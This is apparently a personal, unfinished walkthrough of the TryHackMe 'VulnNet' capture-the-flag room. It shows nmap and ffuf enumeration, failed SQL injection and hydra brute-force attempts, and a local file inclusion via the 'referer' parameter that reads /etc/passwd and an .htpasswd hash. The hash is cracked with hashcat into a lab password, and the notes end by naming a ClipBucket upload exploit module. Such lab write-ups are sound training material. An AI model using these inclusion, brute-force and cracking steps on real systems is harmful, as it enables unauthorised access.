# https://tryhackme.com/room/vulnnet1
## Recon
### nmap
```
$ nmap -sS vulnnet.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 15:14 UTC
Nmap scan report for vulnnet.thm (10.10.143.64)
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
$ nmap -sV -script default -p 22,80 vulnnet.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 15:15 UTC
Nmap scan report for vulnnet.thm (10.10.143.64)
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeration
#### Directory
```
$ ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s
img
css
js
fonts
server-status
```

Two files in js:
```
[ ]	index__7ed54732.js	2021-01-23 20:08 	3.8K
[ ]	index__d8338055.js	2021-01-23 20:08 	2.0K
```
In index__d833055.js there is a URL: (had to look in a writeup for this)
```
http://vulnnet.thm/index.php?referer=
```
And from the source of index.php we see that these scripts are loaded at the end.

```
ffuf -u http://broadcast.vulnnet.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
misc                    [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
22                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
page                    [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
17                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
16                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 84ms]
features                [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 84ms]
23                      [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 83ms]
```

All results in 401 (forbidden), which means the directory enumeration
isn't possible without authentication.

#### Subdomain
Found 5829 by running without -fs and see what size every result reported.
```
$ ffuf -u http://vulnnet.thm -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 5829
broadcast
Broadcast
```

Navigating to http://broadcast.vulnnet.thm results in a http-login prompt (basic authentication).

#### Filenames
```
$ ffuf -u http://vulnnet.thm/FUZZ -e .php,.txt,.html -w /usr/share/seclists/Discovery/Web-Content/big.txt
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 64ms]
.htaccess.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 62ms]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 65ms]
.htaccess.html          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 62ms]
.htpasswd.php           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd.html          [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 63ms]
LICENSE.txt             [Status: 200, Size: 1109, Words: 208, Lines: 26, Duration: 84ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 91ms]
fonts                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 101ms]
img                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 65ms]
index.php               [Status: 200, Size: 5829, Words: 1689, Lines: 142, Duration: 63ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 63ms]
login.html              [Status: 200, Size: 2479, Words: 633, Lines: 70, Duration: 62ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 66ms]
```
LICENSE.TXT stands out
##### LICENSE.TXT
```
/* zlib.h -- interface of the 'zlib' general purpose compression library
  version 1.2.11, January 15th, 2017

  Copyright (C) 1995-2017 Jean-loup Gailly and Mark Adler

  This software is provided 'as-is', without any express or implied
  warranty.  In no event will the authors be held liable for any damages
  arising from the use of this software.

  Permission is granted to anyone to use this software for any purpose,
  including commercial applications, and to alter it and redistribute it
  freely, subject to the following restrictions:

  1. The origin of this software must not be misrepresented; you must not
     claim that you wrote the original software. If you use this software
     in a product, an acknowledgment in the product documentation would be
     appreciated but is not required.
  2. Altered source versions must be plainly marked as such, and must not be
     misrepresented as being the original software.
  3. This notice may not be removed or altered from any source distribution.

  Jean-loup Gailly        Mark Adler
  jloup@gzip.org          madler@alumni.caltech.edu

*/
```

Tried to Google to find out if any project matched, ie had a LICENSE.TXT with the
same content. But no luck.

#### Website
The "Get Started" button leads to /login which "Isn't found on this server".
The "Sign in" in the upper right corner directs to /login.html which contains a
login form. The "Sign up" and "Forgot password" part doesn't seem to do anything.

Clicking on the login button with an empty user:pass as asdf:reqw redirects to this URL:
```
http://vulnnet.thm/login.html?login=asdf&password=reqw#
```

# Exploitation
The only maybe exploitable things I was able to find were the referer variable,
and the login page. So I'll try a few attacks against those.

## Login page
Tried to SQLi with the following URL:
```
http://vulnnet.thm/login.html?login=%27+OR+1%3D1%3B%23&password=asdf
```
But no luck. Leaving out one of the variables doesn't change the behavious either.

## referer
Used burp repeater for this.
### SQLi
```
http://vulnnet.thm/index.php?referer='+OR+1%3D1%3B%23
```
No luck

### Command injection
```
http://vulnnet.thm/index.php?referer=ls
```
Doesn't seem to do anything either.

### File inclusion (https://book.hacktricks.xyz/pentesting-web/file-inclusion)
For funsies, I'll use ffuf for this one.
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 5829
/etc/anacrontab         [Status: 200, Size: 6230, Words: 1710, Lines: 155, Duration: 55ms]
/etc/apache2/apache2.conf [Status: 200, Size: 13053, Words: 2630, Lines: 369, Duration: 55ms]
/etc/apache2/envvars    [Status: 200, Size: 7611, Words: 1878, Lines: 189, Duration: 55ms]
/etc/apache2/mods-available/actions.load [Status: 200, Size: 5895, Words: 1691, Lines: 143, Duration: 56ms]
/etc/apache2/magic      [Status: 200, Size: 36892, Words: 5756, Lines: 1077, Duration: 55ms]
...
```
-fs 5829 was found by changing referer to refererrr in order to find the failing return values.

Here I find a bunch of files, so lets take a closer look in the burp repeater.

By looking at the response in Burp, we can see that the file content is printed
out at the end of the site. I would be very interested in finding out why.
We can investigate that once we get a shell.

## hydra:
Tried to crack the passwords using hydra.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f vulnnet.thm http-get-form "/login.html:login=^USER^&password=^PASS^:F=invalid"
```
Unsuccessfully.
## hydra
Try to crack the broadcast.vulnnet.thm using hydra.
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f broadcast.vulnnet.thm http-get /
```
Unsuccessfully.

## Using LFI to find a way in
Lets check out some useful files.
```
# GET /index.php?referer=/etc/passwd HTTP/1.1
:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```

Focus on the ones with an actual shell.
```
:x:0:0:root:/root:/bin/bash
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```
Looks like there is a server-management user.

There's a list of other files I'd like to check out:
```
/etc/ssh/sshd_config # To see if we can login using a password, or just key-based is allowed
/home/server-management/.bashrc     # .bashrc is highly likely to exist since
                                    # the shell is /bin/bash, so try first with
                                    # that file to see if we can read from server-managements home-dir.
/home/server-management/.ssh/id_rsa     # Private key
/home/server-management/.ssh/id_rsa.pub # Public key
/home/server-management/.ssh/config     # May contain non-default names of ssh-key
/home/server-management/.ssh/authorized_keys
/home/server-management/user.txt
```

Turns out we get no output from
```
# GET /index.php?referer=/home/server-management/.bashrc HTTP/1.1
```
which makes sense, since www-data (which I assume is the user that runs the
web-server) most likely don't have access to /home/server-management.

Lets see if it is possible to login via password, since we can't obtain any
ssh-keys: (only included relevant lines
```
# GET /index.php?referer=/etc/ssh/sshd_config HTTP/1.1
#PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
```
This should mean that we could login via password. Even though one type
of password auth is disabled via "ChallengeResponseAuthentication no", it's still
enabled via the other two options (PasswordAuthentication defaults to yes).

Something else just occured. Perhaps we could enumerate which files exists in /etc
by comparing the result of
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -fs 5829 -s
```
and what is in the wordlist, since -fs would have filtered out the non-existent files.

If we try it with a file that is guaranteed not to exist:
```
$ ffuf -u http://vulnnet.thm/index.php?referer=FUZZ -w ./wordlist.txt
/etc/asdjfailnsonasdf   [Status: 200, Size: 5829, Words: 1689, Lines: 142, Duration: 53ms]
```
it still returns size=5829, which means that we can enumerate many of the files
in /etc. Those not in the wordlist will of course not be enumerated.

At this point im sort of lost, and hydra is not managing to find any valid ssh-pass.

After a peek in a write-up:
According to https://www.digitalocean.com/community/tutorials/how-to-set-up-password-authentication-with-apache-on-ubuntu-14-04,
http basic auth is set up by creating a .htpasswd in /etc/apache2/.htpasswd. Could
probably be in other dirs as well, but lets try the most obvious.
```
GET /index.php?referer=/etc/apache2/.htpasswd HTTP/1.1
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```
So this should be the user:hash for http://broadcast.vulnnet.thm.

### hydra ssh cracking:
```
$ hydra -l server-management -P /usr/share/wordlists/rockyou.txt vulnnet.thm -t 4 ssh
```

### hydra htpasswd crack
```
$ hashcat --force -m 1600 hash.txt /usr/share/wordlists/rockyou.txt # 1600 for md5apr1 hash
$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls
```

## Successfull basic auth login
broadcast.vulnnet.thm takes me to a CLIPBUCKET site.
We can also sign up a new user.

When entering all the fields, and clicking Register, we get an error message
telling us to pick a category. There is no field for the category. But if we
intercept the request with burp, we see that it contains the following:
```
username=user&email=user%40example.com&password=pass&cpassword=pass&dob=1988-04-04&country=NU&gender=Male&category=0&agree=yes&signup=signup
```
So lets try changing "category" to 1 and see what happens. Same error message.
Lets try setting it to "user".
Didn't get an error message.
It seems to be a bug in clipbucket:
https://github.com/MacWarrior/clipbucket-v5/issues/60

I didn't realize it is an actual piece of software.
According to the source it is version 4.0:
```
Signup - ClipBucket v4.0
```

File upload vuln that can be exploited in msfconsole. Just need to figure out
how to specify the credentials.
```
https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/http/clipbucket_fileupload_exec
```


# Questions
1. What is the user flag?

2. What is the root flag?

Notes:
Need to find a automated way to enumerate possible links in a website.
Need to be more diligent in writing down things. I needed a writeup to remind
me of basic auth as a path forward.
